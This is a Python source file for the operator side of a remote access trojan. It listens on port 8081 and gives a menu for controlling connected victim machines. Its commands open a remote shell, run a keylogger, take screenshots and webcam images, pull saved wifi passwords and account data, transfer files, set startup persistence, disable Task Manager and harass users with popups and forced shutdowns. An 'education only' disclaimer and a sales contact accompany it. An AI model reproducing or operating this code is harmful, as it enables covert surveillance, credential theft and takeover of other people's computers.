
import socket, os, time, threading, sys

import sys, os, time, signal, webbrowser, platform, subprocess
from time import sleep
from queue import Queue
from datetime import datetime
from turtle import *




def ketik(s):
	for ASU in s + '\n':
		sys.stdout.write(ASU)
		sys.stdout.flush()
		sleep(50. / 1000)
print("""\
            ───
            ────███████───────────███████
            ───██║║║║║║██────────██║║║║║██
            ──██║║║║║║║║██──────██║║║║║║║██
            ─██║║║║║║║║║║██───██║║║║║║║║║║██
            ██║║║║║║║║║║║║█████║║║║║║║║║║║║██
            █║║║║║║║║║║║║║║║║║║║║║║║║║║║║║║║█
            █║║║║║║║║║║║║║█████║║║║║║║║║║║║║█
            █║║║║║║║║║║║║█░░░░░█║║║║║║║║║║║║█
            █║║║║║║║║║║║║█░░░░░█║║║║║║║║║║║║█
            █║║║║║║║║║║║║█░░░░░█║║║║║║║║║║║║█
            ██║║║║║║║║║║║█░░░░░█║║║║║║║║║║║██
            ██║║║║║║║║║║║║█░░░█║║║║║║║║║║║║██
            ─██║║║║║║║║║║║█░░░█║║║║║║║║║║║██
            ──██║║║║║║║║║║█░░░█║║║║║║║║║║██
            ───██║║║║║║║║║█░░░█║║║║║║║║║██
            ────██║║║║║║║║█████║║║║║║║║██_____Lets get the key 
            ─────██║║║║║║║║███║║║║║║║║██________See Your Luck
            ──────██║║║║║║║║║║║║║║║║║██
            ───────██║║║║║║║║║║║║║║║██_____________?????
            ────────██║║║║║║║║║║║║║██
            ─────────██║║║║║║║║║║║██
            ──────────██║║║║║║║║║██
            ───────────██║║║║║║║██
            ────────────██║║║║║██
            ─────────────██║║║██
            ──────────────██║██
                           ███__________________Type "read" To get infomation   """)
print(''), ketik("                            ↑→________________WAITING 4 ACCESS______________→↓      "), sleep(0.5)                 






intThreads = 2
arrJobs = [1, 2]
queue = Queue()

arrAddresses = []
arrConnections = []

strHost = "0.0.0.0"
#sam ely backdoor using port 8081
#public backdoor using port 9090
intPort = 8081



intBuff = 10024

# function to return decoded utf-8
decode_utf8 = lambda data: data.decode("utf-8")

# function to return string with quotes removed
remove_quotes = lambda string: string.replace("\"", "")

# function to return title centered around string
center = lambda string, title: f"{{:^{len(string)}}}".format(title)

# function to send encrypted data
send = lambda data: conn.send(data)

# function to receive and decrypt data
recv = lambda buffer: conn.recv(buffer)


def recvall(buffer):  # function to receive large amounts of data
    bytData = b""
    while True:
        bytPart = recv(buffer)
        if len(bytPart) == buffer:
            return bytPart
        bytData += bytPart
        if len(bytData) == buffer:
            return bytData


def create_socket():
    global objSocket
    try:
        objSocket = socket.socket()
        objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # reuse a socket even if its recently closed
    except socket.error() as strError:
        print("Error creating socket " + str(strError))


def socket_bind():
    global objSocket
    try:
	
        objSocket.bind((strHost, intPort))
        objSocket.listen(20)
    except socket.error() as strError:
        print("Error binding socket " + str(strError) + " Retrying...")
        socket_bind()


def socket_accept():
    while True:
        try:
            conn, address = objSocket.accept()
            conn.setblocking(1)  # no timeout
            arrConnections.append(conn)  # append connection to array
            client_info = decode_utf8(conn.recv(intBuff)).split("`,")
            address += client_info[0], client_info[1], client_info[2],
            arrAddresses.append(address)
            now = datetime.now()
            current_time = now.strftime("%H:%M:%S")
            #playsound('sam.mp3')
            

	  
	   
	    
            print("\n" + "Key Found: TIME ==> {0}   ({1})".format( current_time, address[2]))
            #playsound('sam.mp3')
           # os.system('fb.pyw')
        except socket.error:
            print("Error accepting connections!")
            continue

            
       
     
	  


def menu_help():
    print("""\  ─────────████
───────────────────────▄██▄▄██▄
──────────────────────██████████
──────────────────────▀████████▀
────────────────────────▀████▀
─────────────────────────████
─────────────────────────████____________Got the Key
─────────────────────────████
─────────────────────────████_________________let's Check 
─────────────────────────████
─────────────────────────████_____________________And Done
─────────────────────────████
─────────────────────────████
──────────────────────▄▄▄████
──────────────────────▀▀▀████
──────────────────────▀▀▀████
──────────────────────▀▀▀████
──────────────────────▄█████▀_______________Type "read" To get infomation       """)



def main_menu():
    while True:
        strChoice = input("\n" + ">> ")

        refresh_connections()  # refresh connection list

        if strChoice == "read":
            print (' ')
            ketik ("\033    (1) Only use Backdoor  Port 8081 otherwise not worked \n\n(2) when backdoor conntected use command try space id\n\n(3) and use password ely Here")
            sleep(0.5)
        elif strChoice == "about":
            print (' ')
            ketik ("\This Software Customized BY Sam Ely .\n\nonly for Education if you use for other work u will fucked by cops..\n\nContact us 8987972933 whatsapp only")       
            sleep(0.5)

        elif strChoice == "sessions":
            list_connections()

        elif strChoice[:3] == "try" and len(strChoice) > 3:
            conn = select_connection(strChoice[4:], "True")
            if conn is not None:
                send_commands()
        elif strChoice == "sam":
            menu_help()

        elif strChoice[:3] == "kill" and len(strChoice) > 3:
            conn = select_connection(strChoice[4:], "False")
            if conn is not None:
                send(str.encode("exit"))
                conn.close()

        elif strChoice == "kill -all":
            close()
            break  # break to continue work() function

        elif strChoice[:3] == "injct" and len(strChoice) > 3:
            conn = select_connection(strChoice[4:], "False")
            if conn is not None:
                command_shell()

        elif strChoice[:3] == "--s" and len(strChoice) > 3:
            send_command_all(strChoice[4:])
        else:
            print("""\b.               Type "read" for help
                                       Type "about" for information


                                                                """)
            menu_help()


def close():
    
    global arrConnections, arrAddresses

    if len(arrAddresses) == 0:  # if there are no computers connected
        return

    for intCounter, conn in enumerate(arrConnections):
        conn.send(str.encode("exit"))
        conn.close()
    del arrConnections; arrConnections = []
    del arrAddresses; arrAddresses = []


def refresh_connections():  # used to remove any lost connections
    global arrConnections, arrAddresses
    for intCounter, conn in enumerate(arrConnections):
        try:
            conn.send(str.encode("test"))  # test to see if connection is active
        except socket.error:
            del arrAddresses[intCounter]
            del arrConnections[intCounter]
            conn.close()


def list_connections():
    refresh_connections()

    if len(arrConnections) > 0:
        strClients = ""

        for intCounter, conn in enumerate(arrConnections):

            strClients += str(intCounter) + 4*" " + str(arrAddresses[intCounter][0]) + 4*" " + \
                        str(arrAddresses[intCounter][1]) + 4*" " + str(arrAddresses[intCounter][2]) + 4*" " + \
                        str(arrAddresses[intCounter][3]) + "\n"

        print("\n" + "ID" + 3*" " + center(str(arrAddresses[0][0]), "IP") + 4*" " +
            center(str(arrAddresses[0][1]), "Port") + 4*" " +
            center(str(arrAddresses[0][2]), "PC Name") + 4*" " +
            center(str(arrAddresses[0][3]), "OS") + "\n" + strClients, end="")
    else:
        print("No connections.")


def select_connection(connection_id, blnGetResponse):
    global conn, arrInfo
    try:
        connection_id = int(connection_id)
        conn = arrConnections[connection_id]
    except:
        print("Invalid choice, please try again!")
        return
    else:
        '''
        IP, PC Name, OS, User
        '''
        arrInfo = str(arrAddresses[connection_id][0]), str(arrAddresses[connection_id][2]), \
                                                              str(arrAddresses[connection_id][3]), \
                                                              str(arrAddresses[connection_id][4])

        if blnGetResponse == "True":
            print("You are connected to " + arrInfo[0] + " ...." + "\n")
        return conn


def send_command_all(command):
    if os.path.isfile("command_log.txt"):
        open("command_log.txt", "w").close()  # clear previous log contents

    for intCounter in range(0, len(arrAddresses)):
        conn = select_connection(intCounter, "False")

        if conn is not None and command != "cmd":
            send_command(command)


def user_info():
    print("IP: " + arrInfo[0])
    print("PC Hacked: " + arrInfo[1])
    print("OS: " + arrInfo[2])
    print("User: " + arrInfo[3])







def screenshot():
    send(str.encode("screen"))
    strClientResponse = decode_utf8(recv(intBuff))  # get info
    print("\n" + strClientResponse)

    intBuffer = ""
    for intCounter in range(0, len(strClientResponse)):  # get buffer size from client response
        if strClientResponse[intCounter].isdigit():
            intBuffer += strClientResponse[intCounter]
    intBuffer = int(intBuffer)

    strFile = time.strftime("%Y%m%d%H%M%S" + ".png")

    ScrnData = recvall(intBuffer)  # get data and write it
    objPic = open(strFile, "wb")
    objPic.write(ScrnData); objPic.close()

    print("Done!!!" + "\n" + "Total bytes received: " + str(os.path.getsize(strFile)) + " bytes")


def browse_files():
    send(str.encode("filebrowser"))
    print("\n" + "Drives :")

    strDrives = decode_utf8(recv(intBuff))
    print(strDrives + "\n")

    strDir = input("Directory: ")

    if strDir == "":
        # tell the client of the invalid directory
        strDir = "Invalid"

    send(str.encode(strDir))

    strClientResponse = decode_utf8(recv(intBuff))  # get buffer size

    if strClientResponse == "Invalid Directory!":  # if the directory is invalid
        print("\n" + strClientResponse)
        return

    intBuffer = int(strClientResponse)
    strClientResponse = decode_utf8(recvall(intBuffer))  # receive full data

    print("\n" + strClientResponse)


def startup():
    send(str.encode("startup"))
    print("Registering ...")

    strClientResponse = decode_utf8(recv(intBuff))
    print(strClientResponse)

def transfer():
    send(str.encode("transfer"))







#my update start here





def account():
    send(str.encode("account"))
    print("createing file ...")
    send(str.encode("screen"))
    strClientResponse = decode_utf8(recv(intBuff))  # get info
    print("\n" + strClientResponse)

    intBuffer = ""
    for intCounter in range(0, len(strClientResponse)):  # get buffer size from client response
        if strClientResponse[intCounter].isdigit():
            intBuffer += strClientResponse[intCounter]
    intBuffer = int(intBuffer)

    strFile = time.strftime("%Y%m%d%H%M%S" + ".txt")

    ScrnData = recvall(intBuffer)  # get data and write it
    objPic = open(strFile, "wb")
    objPic.write(ScrnData); objPic.close()

    print("Done!!!" + "\n" + "Total bytes received: " + str(os.path.getsize(strFile)) + " bytes")
        

        

    


def enter():
        send(str.encode("enter"))
        
       

def win():
        print(' ')
        ketik (" trying 2 press 100 time window key")
        sleep(0.5)
        send(str.encode("win"))

def wifi():
    send(str.encode("wifi"))
    strClientResponse = decode_utf8(recv(intBuff))  # get info
    print("\n" + strClientResponse)

    intBuffer = ""
    for intCounter in range(0, len(strClientResponse)):  # get buffer size from client response
        if strClientResponse[intCounter].isdigit():
            intBuffer += strClientResponse[intCounter]
    intBuffer = int(intBuffer)

    strFile = time.strftime("%Y%m%d%H%M%S" + ".zip")

    ScrnData = recvall(intBuffer)  # get data and write it
    objPic = open(strFile, "wb")
    objPic.write(ScrnData); objPic.close()

    print("Done!!!" + "\n" + "Total bytes received: " + str(os.path.getsize(strFile)) + " bytes")


	
    
        
        
def temp():
        send(str.encode("temp"))


        print(' ')
        ketik (" Deleting backdoor created temp files")
        sleep(0.5)

def hidden():
        send(str.encode("hidden"))

def show():
        send(str.encode("show"))

        
def show():
        send(str.encode("show"))

def popup():
        send(str.encode("popup"))



def distrup():
        send(str.encode("distrup"))
def mouse():
        send(str.encode("mouse"))
def virus():
        send(str.encode("virus"))

def warning():
        send(str.encode("warning"))

def download():
        send(str.encode("download"))

def inject():
        send(str.encode("inject"))

def srt():
        print('srt then app name then " then enter')
        send(str.encode("srt"))

def killscr():
        send(str.encode("killscreen"))
        
        
def camera():
    
    send(str.encode("camera"))
    strClientResponse = decode_utf8(recv(intBuff))  # get info
    print("\n" + strClientResponse)

    intBuffer = ""
    for intCounter in range(0, len(strClientResponse)):  # get buffer size from client response
        if strClientResponse[intCounter].isdigit():
            intBuffer += strClientResponse[intCounter]
    intBuffer = int(intBuffer)

    strFile = time.strftime("%Y%m%d%H%M%S" + ".jpg")

    ScrnData = recvall(intBuffer)  # get data and write it
    objPic = open(strFile, "wb")
    objPic.write(ScrnData); objPic.close()

    print("Done!!!" + "\n" + "Total bytes received: " + str(os.path.getsize(strFile)) + " bytes")





def hked():
        send(str.encode("hked"))

def update():
        send(str.encode("update"))

def Alert():
	

        send(str.encode("Alert"))  
def hakscreen():
 	send(str.encode("hakscreen"))

def hakcamera():
 	send(str.encode("hakcamera"))

   
    
    
    

        

        
        
        


#my update  end Here
             



def send_file():
    strFile = remove_quotes(input("\n" + "File to send: "))
    if not os.path.isfile(strFile):
        print("Invalid File!")
        return

    strOutputFile = remove_quotes(input("\n" + "Output File: "))
    if strOutputFile == "":  # if the input is blank
        return

    send(str.encode("send" + str(os.path.getsize(strFile))))

    objFile = open(strFile, "rb")  # send file contents and close the file
    time.sleep(1)
    send(objFile.read())
    objFile.close()

    send(str.encode(strOutputFile))

    print("Total bytes sent: " + str(os.path.getsize(strFile)))

    strClientResponse = decode_utf8(recv(intBuff))
    print(strClientResponse)


def receive():
    strFile = remove_quotes(input("\n" + "Target file: "))
    strFileOutput = remove_quotes(input("\n" + "Output File: "))

    if strFile == "" or strFileOutput == "":  # if the user left an input blank
        return

    send(str.encode("recv" + strFile))
    strClientResponse = decode_utf8(recv(intBuff))

    print(strClientResponse)

    if strClientResponse == "Target file not found!":
        return

    intBuffer = ""
    for intCounter in range(0, len(strClientResponse)):  # get buffer size from client response
        if strClientResponse[intCounter].isdigit():
            intBuffer += strClientResponse[intCounter]
    intBuffer = int(intBuffer)

    file_data = recvall(intBuffer)  # get data and write it

    try:
        objFile = open(strFileOutput, "wb")
        objFile.write(file_data)
        objFile.close()
    except:
        print("Path is protected/invalid!")
        return

    print("Done!!!" + "\n" + "Total bytes received: " + str(os.path.getsize(strFileOutput)) + " bytes")


def command_shell():  # remote cmd shell
    send(str.encode("cmd"))
    strDefault = "\n" + decode_utf8(recv(intBuff)) + ">"
    print(strDefault, end="")  # print default prompt

    while True:
        strCommand = input()
        if strCommand == "quit" or strCommand == "exit":
            send(str.encode("goback"))
            break

        elif strCommand == "cmd":  # commands that do not work
            print("Please do use not this command!")
            print(strDefault, end="")

        elif len(strCommand) > 0:
            send(str.encode(strCommand))
            intBuffer = int(decode_utf8(recv(intBuff)))  # receive buffer size
            strClientResponse = decode_utf8(recvall(intBuffer))
            print(strClientResponse, end="")  # print cmd output
        else:
            print(strDefault, end="")





    
    
       



def disable_taskmgr():
    send(str.encode("dtaskmgr"))
    print(decode_utf8(recv(intBuff)))  # print response


def screen():  # legal purposes only!
    send(str.encode("remote"))
    
def keylogger(option):
    if option == "start":
        send(str.encode("keystart"))
        if decode_utf8(recv(intBuff)) == "error":
            print("Keylogger is already running.")

    elif option == "stop":
        send(str.encode("keystop"))
        if decode_utf8(recv(intBuff)) == "error":
            print("Keylogger is not running.")

    elif option == "dump":
        send(str.encode("keydump"))
        intBuffer = decode_utf8(recv(intBuff))

        if intBuffer == "error":
            print("Keylogger is not running.")
        elif intBuffer == "error2":
            print("No logs.")
        else:
            strLogs = decode_utf8(recvall(int(intBuffer)))  # get all data
            print("\n" + strLogs)


def send_command(command):
    send(str.encode("runcmd" + command))
    intBuffer = int(decode_utf8(recv(intBuff)))  # receive buffer size

    strClientResponse = "========================" + "\n" + arrInfo[0] + 4*" " + arrInfo[1] + \
                        decode_utf8(recvall(intBuffer)) + \
                        "========================"

    if os.path.isfile("command_log.txt"):
        objLogFile = open("command_log.txt", "a")
    else:
        objLogFile = open("command_log.txt", "w")

    objLogFile.write(strClientResponse + "\n" + "\n")
    objLogFile.close()


def show_help():                  
    print("""\

 _______________                         |*\_/*|________
  |  ___________  |     .-.     .-.      ||_/-\_|______  |
  | |           | |    .****. .****.     | |           | |
  | |   0   0   | |    .*****.*****.     | |   0   0   | |
  | |     -     | |     .*********.      | |     -     | |
  | |   \___/   | |      .*******.       | |   \___/   | |
  | |___     ___| |       .*****.        | |___________| |
  |_____|\_/|_____|        .***.         |_______________|
    _|__|/ \|_|_.............*.............._|________|_
  


                          Awesome Lets Fun    """)


    
    
                                                                                                                                                                                                                                                                                                                                                                                                                        


def send_commands():
    show_help()
    try:
        while True:
            strChoice = input("\n" + "Sam Ely: ")

            


            if strChoice == "hii sam":
                print("\n", end="")
                show_help()
                print('hii')

            elif strChoice == "ely here":
                result = text = " win      100times press windows key \n enter      100 times press enter\n msg      Send message .\n rcv      Receive file from the user \n open     Opn a website \n rcv      Receive file from the user\n send     Send file to the user \n scrshot  Take screenshot \n strup    Run at startup \n vfile    View files \n usrinfo  User Info \n getit    Open remote cmd \n dt       Disable task manager\n server   (start) (stop) (dump) Keylogger \n hack     Get Data \n lock     Lock user \n restart  Restart user \n down     Shutdown user \n bck      Move connection to background \n kill     Close connection \n other    come soon    \n temp     erase temp folder \n  account     get a account info \n enter     100 times press enter key \n win        press windows key 100 times \n wifi     get all wifi password connected devices \n  hidden      all fles will be hideen \n show     all files show \n distrup    victim feel distup \n  mouse       change the mouse click \n virus         get a infected msg \n   srt     start a program\n  hked     set program on start up       " 
                
                
                
                
                print(result)
                


                
            elif strChoice == "kill":
                send(str.encode("exit"))
                conn.close()
                break
            elif strChoice[:3] == "msg" and len(strChoice) > 3:
                strMsg = "msg" + strChoice[4:]
                send(str.encode(strMsg))

            elif strChoice[:3] == "srt" and len(strChoice):
                strMsg = "" + strChoice
                send(str.encode(strMsg))

            elif strChoice[:5] == "popup" and len(strChoice) > 3:
                strMsg = "popup" + strChoice[4:]
                send(str.encode(strMsg))

           


             
            elif strChoice == "account":
                account()
            elif strChoice == "update":
                update()

            elif strChoice == "enter":
                enter()

            elif strChoice == "win":
                win()
            elif strChoice == "wifi":
                wifi()
            elif strChoice == "temp":
                temp()
            elif strChoice == "hidden":
                hidden()

            elif strChoice == "show":
                show()
            elif strChoice == "distrup":
                distrup()
            elif strChoice == "mouse":
                mouse()
            elif strChoice == "virus":
                virus()
            elif strChoice == "warning":
                warning()

            elif strChoice == "download":
                download()
	    
            
            elif strChoice == "srt":
                srt()
            elif strChoice == "transfer":
                transfer()
            elif strChoice == "killscr":
                killscr()
            elif strChoice == "hakscreen":
                hakscreen()
            elif strChoice == "hakcamera":
                hakcamera()
	    		

            elif strChoice == "camera":
                camera()
	    
            elif strChoice == "Alert":
                Alert()

	   
	    
	    
	    

            elif strChoice == "hked":
                hked()
            elif strChoice == "inject":
                inject()
	    

	    

	    

            

           

          



                
            elif strChoice[:3] == "opn" and len(strChoice) > 3:
                strSite = "site" + strChoice[4:]
                send(str.encode(strSite))


                
            elif strChoice == "strup":
                startup()


	   
	    



                
            elif strChoice == "usrinfo":
                user_info()
            elif strChoice == "scrshot":
                screenshot()
            elif strChoice == "vfile":
                browse_files()
            elif strChoice == "send":
                send_file()
            elif strChoice == "rcv":
                receive()
            elif strChoice == "lock":
                send(str.encode("lock"))
            elif strChoice == "down":
                send(str.encode("shutdown"))
                conn.close()
                break
            elif strChoice == "restart":
                send(str.encode("restart"))
                conn.close()
                break
            elif strChoice == "bck":
                break
            elif strChoice == "getit":
                command_shell()

                
            elif strChoice == "dt":
                disable_taskmgr()
	    
            elif strChoice == "screen":
                screen()
            elif strChoice == "server start":
                keylogger("start")
            elif strChoice == "server stop":
                keylogger("stop")
            elif strChoice == "hack":
                keylogger("dump")
            else:
                print("Invalid choice, please try again!")

    except socket.error as e:  # if there is a socket error
        print("Error, connection was lost! :" + "\n" + str(e))
        return


def create_threads():
    for _ in range(intThreads):
        objThread = threading.Thread(target=work)
        objThread.daemon = True
        objThread.start()
    queue.join()


def work():  # do jobs in the queue
    while True:
        intValue = queue.get()
        if intValue == 1:
            create_socket()
            socket_bind()
            socket_accept()
        elif intValue == 2:
            while True:
                time.sleep(0.2)
                if len(arrAddresses) > 0:
                    main_menu()
                    break
        queue.task_done()
        queue.task_done()
        sys.exit(0)


def create_jobs():
    for intThread in arrJobs:
        queue.put(intThread)  # put thread id into list
    queue.join()

create_threads()
create_jobs()
